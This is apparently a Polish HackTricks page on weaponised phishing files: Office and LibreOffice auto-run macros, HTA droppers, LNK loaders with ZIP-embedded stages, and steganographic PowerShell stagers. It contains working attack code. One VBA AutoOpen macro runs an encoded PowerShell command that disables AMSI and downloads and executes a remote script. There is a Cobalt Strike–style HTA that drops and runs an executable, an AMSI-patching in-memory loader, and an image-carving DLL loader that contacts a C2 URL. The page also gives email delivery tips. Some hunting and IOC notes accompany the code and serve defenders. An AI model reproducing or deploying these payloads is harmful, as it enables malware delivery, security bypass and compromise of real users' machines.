# Pliki i dokumenty Phishingowe

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word wykonuje walidację danych pliku przed otwarciem pliku. Walidacja danych jest wykonywana w formie identyfikacji struktury danych, zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi jakikolwiek błąd, analizowany plik nie zostanie otwarty.

Zwykle pliki Word zawierające makra używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku przez zmianę rozszerzenia i nadal zachowanie możliwości wykonywania makr.\
Na przykład plik RTF nie obsługuje makr z założenia, ale plik DOCM przemianowany na RTF zostanie obsłużony przez Microsoft Word i będzie zdolny do wykonywania makr.\
Te same wewnętrzne mechanizmy i zasady mają zastosowanie do całego oprogramowania z pakietu Microsoft Office Suite (Excel, PowerPoint itp.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy Office:
```bash
assoc | findstr /i "word excel powerp"
```
Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go), który zawiera makra, również mogą „wykonać” makra.

### External Image Load

Przejdź do: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, oraz **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Można użyć makr do uruchomienia dowolnego kodu z dokumentu.

#### Autoload functions

Im są one bardziej powszechne, tym bardziej prawdopodobne, że AV je wykryje.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ręczne usuwanie metadanych

Przejdź do **File > Info > Inspect Document > Inspect Document**, co otworzy Document Inspector. Kliknij **Inspect** i następnie **Remove All** obok **Document Properties and Personal Information**.

#### Rozszerzenie Doc

Po zakończeniu wybierz z rozwijanego menu **Save as type**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
Zrób to, ponieważ **nie możesz zapisywać makr w `.docx`** i istnieje **stygmat** **wokół** rozszerzenia **`.docm`** z włączonymi makrami (np. ikona miniatury ma ogromny `!`, a niektóre bramki web/email całkowicie je blokują). Dlatego to **legacy rozszerzenie `.doc` jest najlepszym kompromisem**.

#### Generatory złośliwych makr

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

Dokumenty LibreOffice Writer mogą osadzać makra Basic i automatycznie je wykonywać po otwarciu pliku, przypinając makro do zdarzenia **Open Document** (Tools → Customize → Events → Open Document → Macro…). Proste makro reverse shell wygląda tak:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note podwójne cudzysłowy (`""`) wewnątrz ciągu – LibreOffice Basic używa ich do escape'owania dosłownych cudzysłowów, więc payloady, które kończą się na `...==""")`, zachowują zbalansowanie zarówno wewnętrznej komendy, jak i argumentu `Shell`.

Wskazówki dotyczące dostarczania:

- Zapisz jako `.odt` i powiąż makro ze zdarzeniem dokumentu, aby uruchamiało się natychmiast po otwarciu.
- Podczas wysyłania maila za pomocą `swaks`, użyj `--attach @resume.odt` (`@` jest wymagane, aby jako załącznik zostały wysłane bajty pliku, a nie sam string nazwy pliku). Jest to krytyczne przy nadużywaniu serwerów SMTP, które akceptują dowolnych odbiorców `RCPT TO` bez walidacji.

## HTA Files

HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i wykonuje się jako aplikacja "fully trusted", bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA jest uruchamiane za pomocą **`mshta.exe`**, które jest zazwyczaj **zainstalowane** razem z **Internet Explorer**, co sprawia, że **`mshta` zależy od IE**. Jeśli więc został odinstalowany, HTA nie będą mogły się uruchomić.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Wymuszanie NTLM Authentication

Istnieje kilka sposobów na **wymuszenie NTLM authentication "zdalnie"**, na przykład możesz dodać **niewidoczne obrazki** do emaili lub HTML, do których użytkownik będzie miał dostęp (nawet HTTP MitM?). Albo wysłać ofierze **adres plików**, które **wyzwolą** **authentication** już przy **otwieraniu folderu.**

**Sprawdź te pomysły i więcej na kolejnych stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Nie zapomnij, że możesz nie tylko ukraść hash albo authentication, ale też **przeprowadzać ataki NTLM relay**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Wysoce skuteczne kampanie dostarczają ZIP, który zawiera dwa legalne dokumenty-przynęty (PDF/DOCX) oraz złośliwy .lnk. Sztuczka polega na tym, że właściwy PowerShell loader jest przechowywany w surowych bajtach ZIP-a za unikalnym markerem, a .lnk wycina go i uruchamia całkowicie w pamięci.

Typowy flow zaimplementowany w jednowierszowym PowerShell .lnk:

1) Zlokalizuj oryginalny ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz katalog nadrzędny bieżącego working directory.
2) Odczytaj bajty ZIP i znajdź zakodowany na sztywno marker (np. xFIQCV). Wszystko po markerze to osadzony PowerShell payload.
3) Skopiuj ZIP do %ProgramData%, rozpakuj go tam i otwórz przynętowy .docx, aby wyglądać na legalny.
4) Omiń AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Zdeobfuskuj następny stage (np. usuń wszystkie znaki #) i wykonaj go w pamięci.

Przykładowy szkielet PowerShell do wycięcia i uruchomienia osadzonego stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Uwagi
- Dostarczanie często nadużywa renomowanych subdomen PaaS (np. *.herokuapp.com) i może gate’ować payloady (serwować nieszkodliwe ZIP-y na podstawie IP/UA).
- Kolejny etap często odszyfrowuje base64/XOR shellcode i uruchamia go przez Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.

Persistence używane w tym samym łańcuchu
- COM TypeLib hijacking kontrolki Microsoft Web Browser tak, aby IE/Explorer lub dowolna aplikacja ją osadzająca automatycznie uruchamiała payload ponownie. Szczegóły i gotowe do użycia komendy tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Pliki ZIP zawierające ciąg znaków ASCII marker (np. xFIQCV) dołączony do danych archiwum.
- .lnk, który wylicza foldery nadrzędne/użytkownika, aby zlokalizować ZIP, i otwiera dokument wabik.
- Manipulacja AMSI przez [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długotrwałe wątki biznesowe kończące się linkami hostowanymi pod zaufanymi domenami PaaS.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Inny powracający wzorzec to **.lnk udający dokument**, który natychmiast otwiera nieszkodliwy wabik, podczas gdy w tle przygotowuje prawdziwy łańcuch.

Zaobserwowany przepływ:
1. Skrót **podszywa się pod PDF** i używa conhost.exe lub podobnego proxy do uruchomienia zaciemnionego downloadera PowerShell.
2. PowerShell fragmentuje oczywiste tokeny (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), więc proste detekcje szukające `iwr`, `gci`, `ren`, `cpi` lub `schtasks` nie wykrywają polecenia.
3. Stager najpierw pobiera **dokument wabik**, otwiera go dla ofiary, a następnie odtwarza złośliwe pliki w tle.
4. Payloady mogą być zapisywane z **junk extensions**, a następnie zmieniane przez usunięcie wypełniaczy, co opóźnia pojawienie się oczywistych artefaktów `.exe` / `.cpl`.
5. Persistence jest ustanawiane za pomocą **scheduled task opartego na minutach**, który uruchamia zaufany binarny host z ścieżki zapisywalnej przez użytkownika.

Minimalne wskazówki huntingowe z tego wzorca:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
A useful staging layout to recognize is:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Why the second stage is stealthy

W studium przypadku Rapid7, zaplanowane zadanie wielokrotnie uruchamiało **`Fondue.exe`** z `C:\Users\Public\`. Ponieważ **`APPWIZ.cpl`** był obok niego przygotowany i eksportował **`RunFODW`**, zaufany binarny plik Microsoft side-loadedował CPL atakującego zamiast legalnej kopii systemowej.

Następnie CPL:
- Odczytuje blob **AES-256-CBC** z `C:\Windows\Tasks\editor.dat`
- Odszyfrowuje go przez **Windows CNG / `bcrypt.dll`**
- Alokuje wykonywalną pamięć i kopiuje odszyfrowany shellcode
- Wykonuje go pośrednio, przekazując wskaźnik shellcode jako callback dla **`EnumUILanguagesW`**

Ten ostatni krok warto wykrywać osobno: malware często unika bezpośredniego skoku `((void(*)())buf)()` i zamiast tego nadużywa **legitimate callback-taking WinAPI** do przekazania sterowania.

Odszyfrowany payload w tej kampanii to był shellcode **Donut**, który następnie mapował końcowy PE całkowicie w pamięci i patchował **AMSI/WLDP/ETW** w bieżącym procesie przed przekazaniem wykonania dalej. Więcej informacji o side-loading i post-processingu w pamięci znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktyczne punkty zaczepienia do huntingu:
- `.lnk` uruchamiający `powershell.exe` lub `conhost.exe`, po którym pojawia się widoczny plik-dystraktor.
- Krótkotrwałe pobrania do **`C:\Users\Public\`** po których następują natychmiastowe zmiany nazw z bezsensownych rozszerzeń.
- Zaplanowane zadania z banalnymi nazwami, takimi jak `GoogleErrorReport`, uruchamiane z **user-writable directories**.
- Zaufane binaria ładujące pliki **`.cpl` / `.dll`** z tego samego nie-systemowego katalogu.
- Bloby tekstu Base64 zapisywane w **`C:\Windows\Tasks\`**, a następnie odczytywane przez side-loaded module.

## Steganography-delimited payloads in images (PowerShell stager)

Nowsze łańcuchy loaderów dostarczają zaciemniony JavaScript/VBS, który dekoduje i uruchamia stager PowerShell w Base64. Ten stager pobiera obraz (często GIF), który zawiera zakodowany w Base64 .NET DLL ukryty jako zwykły tekst między unikalnymi znacznikami start/end. Skrypt szuka tych delimiterów (przykłady widziane w praktyce: «<<sudo_png>> … <<sudo_odt>>>»), wyciąga tekst pomiędzy nimi, dekoduje Base64 do bajtów, ładuje assembly w pamięci i wywołuje znaną metodę wejściową z adresem URL C2.

Workflow
- Stage 1: Archived JS/VBS dropper → dekoduje osadzony Base64 → uruchamia PowerShell stager z -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → pobiera obraz, wycina Base64 ograniczony markerami, ładuje .NET DLL w pamięci i wywołuje jego metodę (np. VAI), przekazując URL C2 i opcje.
- Stage 3: Loader pobiera finalny payload i zwykle wstrzykuje go przez process hollowing do zaufanego binaru (najczęściej MSBuild.exe). Więcej o process hollowing i trusted utility proxy execution tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Przykład PowerShell do wycięcia DLL z obrazu i wywołania metody .NET w pamięci:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Uwagi
- To jest ATT&CK T1027.003 (steganography/marker-hiding). Markers różnią się między kampaniami.
- AMSI/ETW bypass i string deobfuscation są zwykle stosowane przed załadowaniem assembly.
- Hunting: skanuj pobrane obrazy pod kątem znanych delimiters; identyfikuj PowerShell uzyskujący dostęp do obrazów i natychmiast dekodujący Base64 blobs.

Zobacz też stego tools i carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Powtarzający się początkowy etap to mały, silnie ‑obfuscowany `.js` lub `.vbs` dostarczany w archiwum. Jego jedynym celem jest zdekodowanie osadzonego ciągu Base64 i uruchomienie PowerShell z `-nop -w hidden -ep bypass`, aby zainicjować kolejny etap przez HTTPS.

Logika szkieletowa (abstrakcyjnie):
- Odczytaj zawartość własnego pliku
- Zlokalizuj blob Base64 między junk strings
- Zdekoduj do ASCII PowerShell
- Wykonaj za pomocą `wscript.exe`/`cscript.exe`, wywołując `powershell.exe`

Wskazówki do hunting
- Dołączone do archiwum JS/VBS uruchamiające `powershell.exe` z `-enc`/`FromBase64String` w command line.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` ze ścieżek tymczasowych użytkownika.

## Windows files to steal NTLM hashes

Sprawdź stronę o **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
